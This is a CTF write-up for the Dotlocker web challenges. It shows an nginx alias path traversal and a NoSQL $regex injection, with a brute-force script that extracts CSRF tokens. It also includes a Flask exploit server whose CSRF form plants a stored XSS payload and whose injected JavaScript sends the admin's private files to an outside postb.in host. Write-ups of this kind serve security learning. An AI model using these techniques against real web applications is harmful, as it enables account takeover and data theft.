# Dotlocker 1

This was the only flag I managed to capture during the CTF itself, and this was definitely interesting enough to warrant a write up for both parts (we figured out Dotlocker 2 after the CTF ended)!

Visiting the main page we're greeted with the DotLocker application. Looks like it's specifically designed to do dotfile storage. Neat!

![image](https://user-images.githubusercontent.com/1072598/97641961-7a676380-1a1a-11eb-9840-985bf26e771b.png)

Generally with web apps you want to capture all the functionality you can, so I generally start off testing through all the workflows I can, so creating a new dotfile, creating one from a skeleton, etc etc. 

![image](https://user-images.githubusercontent.com/1072598/97642025-9a972280-1a1a-11eb-87b0-b3a5cbf2437a.png)

The first thing to notice is that when you create a new dotfile from a template, it seems to be fetching it directly from the `/etc` directory! Interesting design choice, but also not entirely outside the realm of possibility if you've ever met "enterprise" developers :P. 

![image](https://user-images.githubusercontent.com/1072598/97642129-d0d4a200-1a1a-11eb-9d42-42d74f69780b.png)

So let's tinker! We have no idea about the stack at this point, but the standard LFI -> RCE path is to use your LFI to include `/proc/self/environ` and hope to inject code into one of the CGI environment variables passed in. Let's try that:

![image](https://user-images.githubusercontent.com/1072598/97642320-3c1e7400-1a1b-11eb-927d-5766fed17d1b.png)

Hmm, no dice. Testing around for other files (`/var/log/auth.log`, `/var/log/messages`, etc) it's clear that we're likely constrained to `/etc` only :-/. Well, with that, what else can we see? Files like `/etc/shadow` and `/etc/passwd` help us enumerate users on the system (and potentially brute-force their credentials).

![image](https://user-images.githubusercontent.com/1072598/97642456-915a8580-1a1b-11eb-988e-e996dbdefdb8.png)

Looks like we have an `app` user with uid 1337 :P. How about /etc/shadow?

![image](https://user-images.githubusercontent.com/1072598/97642489-a9caa000-1a1b-11eb-9621-12457163dc71.png)

Interesting! This implies that the webserver isn't actually running as root on the box (the `app` user also helps confirm that) and likely doesn't have permissions to read that.

Anyway, what else can we examine in here that might give us hints? 

![image](https://user-images.githubusercontent.com/1072598/97642533-d2529a00-1a1b-11eb-9e15-cc09ddde14a2.png)

Looking at the response headers, it looks like there's an nginx server running, let's try to find the config for that?

![image](https://user-images.githubusercontent.com/1072598/97642568-e8f8f100-1a1b-11eb-9e1e-2cf3985d3fdb.png)

Hey that works, looks like we have our main nginx config file here and we can read it. Typically this file is more of a general catch-all config, most site configs live in `/etc/nginx/sites-enabled/default` or `/etc/nginx/sites-available/default`, so let's check those for more info.

![image](https://user-images.githubusercontent.com/1072598/97642640-15147200-1a1c-11eb-97df-62c2cc66c95e.png)

A hah! That looks promising. With this config we're able to discern:
- There's a `/server` folder on the server, that's holding a `server.py` file
- This application is using gunicorn as it's python server, being proxied to through nginx
- This application has a `/static` directory, aliased to `/server/static`

The `/static` route shares out files using the nginx `alias`, but seems somewhat suspect (there are a few ways to configure these static routes, and alias isn't one I'm familiar with). 

Googling "nginx alias vulnerability" lead me to https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/, which describes an issue with this exact config. Apparently not having a trailing `/` on `/static` means we can traverse up a directory and read files we shouldn't be able to, which is *very* relevant to our interests!

![image](https://user-images.githubusercontent.com/1072598/97642928-c61b0c80-1a1c-11eb-907b-6cac076664ee.png)

Requesting `/static../server.py` and bam! We found our flag - `flag{0ff_by_sl4sh_n0w_1_hav3_y0ur_sourc3}`


# Dotlocker 2
This was an interesting challenge in that it builds off Dotlocker 1, using the source file you leaked in part 1 to gain a foothold to further exploit things.

### Exploration

It's important to know that one of my teammates discovered a stored XSS in the code editor, so that will be useful later in this write-up!

Picking up where we left off, we look at the `server.py` file, and 3 things jump out immediately:
- There is a non-standard module named `db` being imported (presumably from the local directory)
- There is a non-standard module named `admin` being imported (presumably from the local directory)
- There is a `secret` file being used to prime the app-wide secret key that's used to sign session cookies (implying we might be able to recover it and generate our own session with any user)

![image](https://user-images.githubusercontent.com/1072598/97643240-87d21d00-1a1d-11eb-963d-a17541545025.png)

Trying to pull down the `secret` file nets a 403 :-/

![image](https://user-images.githubusercontent.com/1072598/97643422-fe6f1a80-1a1d-11eb-9698-0a1029eac79d.png)

Likewise, trying to download the `admin.py` file nets the same result 

![image](https://user-images.githubusercontent.com/1072598/97643456-0e86fa00-1a1e-11eb-9e08-ae06829c580f.png)

However! `db.py` is readily accessible :) 

![image](https://user-images.githubusercontent.com/1072598/97643480-22326080-1a1e-11eb-98d5-f7a2b2bc8120.png)

Even better, this uses MongoDB, so you know it's webscale for this CTF ;).

From here we can audit these source files looking for issues or hidden functionality! 

I suspected there was something baked into some of these templates, and sure enough I was able to pull down templates like `/static../templates/base.html` to look for hidden template comments, but it turns out this was a dead end. Damn!

We can also now see the `/new/<path>` route that had our original "LFI" in it, though this seems coded well and unable to be abused to break out of `/etc`.

![image](https://user-images.githubusercontent.com/1072598/97643643-ab499780-1a1e-11eb-8b2d-81c830d1d2ea.png)

Right under it we have this function which isn't used anywhere on the frontend, so I suspected that flask's `send_from_directory` had some quirk that might lead to a vuln, but auditing the code it looks like things are secure. Another brick wall :( 

![image](https://user-images.githubusercontent.com/1072598/97643678-c74d3900-1a1e-11eb-9439-f089179eb0f2.png)

It was around this time I randomly typed `admin` into the search box which brings us to `http://dotlocker.hackthe.vote/public/5f8f7cc164359d236ef1fc81`, telling us that the "admin" user has an ID of `5f8f7cc164359d236ef1fc81`, and that they have one dot file we can access - http://dotlocker.hackthe.vote/public/5f8f7cc164359d236ef1fc81/_bashrc.

The `.bashrc` file is pretty hilarious though!

![image](https://user-images.githubusercontent.com/1072598/97643807-0d0a0180-1a1f-11eb-93e7-589f90658744.png)

Back to the source code! 

Digging through some more it becomes obvious that there are extra attributes on these dotfiles either showing them or preventing them from being shown in public.

What's this at the bottom though?!

![image](https://user-images.githubusercontent.com/1072598/97644312-5c046680-1a20-11eb-97d5-bc6ce59afd3f.png)

I like hidden urls! Visiting the page brings up this.

![image](https://user-images.githubusercontent.com/1072598/97644346-71799080-1a20-11eb-80a0-500cc02dcb91.png)

Now at this point my first thoughts are the CTF organizers built some sort of SSRF-as-a-service. I learned about a neat tool called PostBin (), so I generated one of those and had the admin "visit" it.

![image](https://user-images.githubusercontent.com/1072598/97644430-a84fa680-1a20-11eb-95b9-d8d7c2f824f4.png)

Sure enough, refreshing the page (https://postb.in/b/1604015674224-8191936721559) gives us a user agent of `user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/88.0.4299.0 Safari/537.36`, so this *IS* some sort of SSRF-as-a-service. 

My next thoughts were that we'd be able to reflect through this to somehow ship off something like AWS metadata to us or exploit something within the application (maybe shoveling the `secret` to us so we can generate our own keys?).

### Finally a break!

By this point the CTF was well over and we were still tinkering when one of my team-mates in the discord posted this:

![image](https://user-images.githubusercontent.com/1072598/97644533-f1075f80-1a20-11eb-84ae-2767072b2760.png)

Interesting! So we're supposed to get a nosqli somewhere that leaks us the CSRF token, then we need to CSRF the admin user using this SSRF-as-a-service tool. 

The nosql injection is *very* subtle, but once you see it you can figure out how to exploit it. The vulnerability itself is in the `@csrf` decorator, which is only used by the `/save` route. 

![image](https://user-images.githubusercontent.com/1072598/97644644-3f1c6300-1a21-11eb-9a6b-b1219c137c11.png)

![image](https://user-images.githubusercontent.com/1072598/97644634-388deb80-1a21-11eb-98a3-f5cb9fefd2ac.png)

The important code is highlighted below:

![image](https://user-images.githubusercontent.com/1072598/97644684-56f3e700-1a21-11eb-8850-f12cb8068e49.png)

Essentially this says:
- If we have a GET request, just allow the request through (no need to check CSRF)
- If we have a submitted HTML form, get the `_csrf_token` and `_id` from it, passing them into `db.valid_csrf()`
- If we *don't* have a submitted HTML form, but *do* have a JSON request, set `_csrf_token` and `_id` from those JSON variables sent as part of the request.

So then what does `db.valid_csrf()` do?

![image](https://user-images.githubusercontent.com/1072598/97644787-a1756380-1a21-11eb-9f0a-d5a3b7b23d11.png)

It takes those values and pops them directly into a `db.users.find_one` request. 

The thing it fails to account for is that the data type being passed in with a JSON request is, well, JSON, and it might have nested objects in it that will get passed into the mongodb request. 

Reading up on nosql injections, I found https://securityboulevard.com/2020/08/mitigating-nosql-injection-attacks-part-2/, which outlines nosql injections, mentioning the `$regex` operator!

So now the question is, are we able to leverage this into something that lets us leak that CSRF token? Let's try it with our own id and token first to see what it does if we just submit JSON:

![image](https://user-images.githubusercontent.com/1072598/97645229-bb637600-1a22-11eb-8b3d-2e8d95dbd10d.png)

400, alright, somewhat expected since we get into our `/save` handler, and didn't post an actual form. What if we change the csrf token though?

![image](https://user-images.githubusercontent.com/1072598/97645267-d504bd80-1a22-11eb-8ea9-09d338a16ac7.png)

Interesting! Now we get a 403 forbidden. This tells me that if we have a *valid* csrf token / id pair, we'll get 400's returned, if there's an issue our csrf validation logic kicks in and returns a 403 fobidden.

Now what happens if we make our `_csrf_token` parameter an object with a `$regex` expression? 

![image](https://user-images.githubusercontent.com/1072598/97645352-1bf2b300-1a23-11eb-88ca-76cc0ca02c95.png)

Neat, that seems to work still (we still get our 400)! Making moves :) 

Now what if we lopped off a bunch of bytes and put `*` at the end?

![image](https://user-images.githubusercontent.com/1072598/97645431-5ceac780-1a23-11eb-9fe9-5a0ec667435d.png)

Another 400! Now we know this is exploitable, so let's get to 'sploitin!

At this point I whipped together a script to iterate through and brute-force out a csrf token for a given user id, which can be done like this:

```python
import requests
import string

characters = string.ascii_lowercase[:6] + string.digits

LEN = 64

payload = ""

headers = {
	"Cookie": "session=eyJfaWQiOnsiIGIiOiJOV1k1WWpSaVpUSTJORE0xT1dReU0yUTBZMkk0TWprMSJ9fQ.X5tL4g.kYWc_tNEzxHKo7QVHnNsV2GJxBw"
}

for x in range(LEN):
	for char in characters:
		# print("Requesting")
		response = requests.post('http://dotlocker.hackthe.vote/save', json={
			"_csrf_token": {"$regex": "^{}".format(payload + char)},
			"_id": "5f9b4be264359d23d4cb8295"
		}, headers=headers)
		if response.status_code == 400:
			print("found - {}".format(payload + char))
			payload += char
			break

```

Note that `5f9b4be264359d23d4cb8295` is OUR ID, so we're just trying to ensure we can recover our own CSRF token before unleashing this on the admin :). 

![image](https://user-images.githubusercontent.com/1072598/97645751-2a8d9a00-1a24-11eb-9a69-28bd57583083.png)

Before you know it, our script has successfully extracted our CSRF token (`c81b0c250ea043282fd0edb8eb14ca0f4bfcd936366d0165265ed649b147d0e6`), so let's do the same thing but change the ID to `5f8f7cc164359d236ef1fc81` to capture the admin's CSRF token. 

Note! We have to change the response status code check to check for a 401, we get that returned if we're trying to fiddle with users that aren't us! 

![image](https://user-images.githubusercontent.com/1072598/97645580-b521c980-1a23-11eb-9d23-6185f4f43134.png)

Finally we're able to see that the admin's (ID: `5f8f7cc164359d236ef1fc81`) CSRF token is `c81b0c250ea043282fd0edb8eb14ca0f4bfcd936366d0165265ed649b147d0e6`. Perfect!

### Launching the exploit

At this point we know we're supposed to CSRF the admin user to do what exactly? Why to XSS themselves of course! We can use the XSS found earlier in our exploring to potentially execute arbitrary JS as the context of the admin user, assuming we can have them visit a link that drops our XSS payload onto their dotfile repo (then another one to trigger it). 

I needed to be able to have the admin thing reach directly to me, so I launched the ngrok docker image:
```
$ docker run --net=host -it --rm wernight/ngrok ngrok http host.docker.internal:3000
```

Which gives me an ability to serve requests to my special ngrok url

![image](https://user-images.githubusercontent.com/1072598/97646053-01213e00-1a25-11eb-9f03-bc39e6469c31.png)

So what to serve then? Well how about a webpage that, when visited, will force a POST request to the `/save` endpoint with our evil payload in it?

I put together a flask server to host the malicious CSRF form which forces the admin to submit a CSRF with my XSS payload in it (which just dynamically includes my flask app's `/script.js` route). 

Basically this exploit works in a few steps:
- First, have the admin hit the ngrok server directly, which submits the XSS payload into a file named `adsf`. The first admin you put into the SSRF-as-a-service is the ngrok server, so it hits the `/` handler and makes our CSRF POST request to land the XSS payload. Pointing the <script> tag at a postb.in can help confirm that the exploit is viable (note the referrer)
    ![image](https://user-images.githubusercontent.com/1072598/97646597-75a8ac80-1a26-11eb-9d91-4f6cb8544dce.png)

- Second, you request the admin visit `http://dotlocker.hackthe.vote/files/asdf`, which will execute our XSS payload, forcing the admin's browser to load https://some-ngrok-server/script.js. "Phase 1" noted in the JS is responsible for creating an iframe, enumerating all files in the admin's private space, and smuggling them out via postb.in. This ultimately gives us these files
    ![image](https://user-images.githubusercontent.com/1072598/97646643-97a22f00-1a26-11eb-9094-8aab279515bb.png)

- Third, do the same process with Iframes, but instead load up `flag.txt`, and smuggle that off to us, getting our flag as well as an overwhelming sense of accomplishment :D 
    ![image](https://user-images.githubusercontent.com/1072598/97646745-cfa97200-1a26-11eb-8db2-2063ed105a3a.png)

And finally, here's the exploit server I wrote to finally get me that sweet sweet flag!

```python
import os
from functools import wraps

from flask import Flask, request, abort, send_from_directory, render_template, session, redirect, url_for, Response

app = Flask(__name__)

# Text value below is literally just this, which bootstraps a new JS file every time as I want to edit things
# if [ </span><script src="http://3f5f510541c4.ngrok.io/script.js"></script> ]; then

HTML = """
<html>
    <h1>Hello, goodbye!</h1>

    <form name='x' action="http://dotlocker.hackthe.vote/save" method="POST">
        <div class="field">
          <div class="control">
            <input class="input" type="text" name="name" id="nameprompt" placeholder="Dotfile Name" value="asdf">
            <input type="hidden" name="text" id="textbody">
            <input type="hidden" name="_csrf_token" value="e991d39e30cee6c53494428e12e9632092aa735d2c19d5081595f7c57da3755e">
            <input type="hidden" name="_id" value="5f8f7cc164359d236ef1fc81">
          </div>
        </div>
    </form>

    <script>
        document.x.text.value = decodeURIComponent('%69%66%20%5b%20%3c%2f%73%70%61%6e%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%33%66%35%66%35%31%30%35%34%31%63%34%2e%6e%67%72%6f%6b%2e%69%6f%2f%73%63%72%69%70%74%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%20%5d%3b%20%74%68%65%6e')
        document.x.submit();
    </script>
</html>
"""

@app.route('/', methods=['GET','POST'])
def index():
    return Response(HTML, mimetype='text/html')

@app.route('/script.js')
def script():
    print(request)
    return """
var iframe = document.createElement('iframe');

// Phase 1 iframe should load the files directory
//iframe.setAttribute('src', 'http://dotlocker.hackthe.vote/files/');

// Phase 2 iframe should load the individual file
iframe.setAttribute('src', 'http://dotlocker.hackthe.vote/files/flag.txt');

// Phase 1: enumerating all the files
// iframe.onload = function() { 
//     let files = [];
//     iframe.contentDocument.documentElement.querySelectorAll('.box').forEach((item) => { files.push(item.innerText) })
//     var img = document.createElement('img');
//     img.setAttribute('src', 'https://postb.in/1603684417670-7872029298450?' + new URLSearchParams({
//         files: files,
//     }));
// }; 

// Phase 2: getting file contents
iframe.onload = function() { 
    var img = document.createElement('img');
    // Ship everything off to postbin for capture
    img.setAttribute('src', 'https://postb.in/1603684417670-7872029298450?' + new URLSearchParams({
        content: iframe.contentDocument.documentElement.innerText,
    }));
}; 

document.body.appendChild(iframe);
"""

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1')
```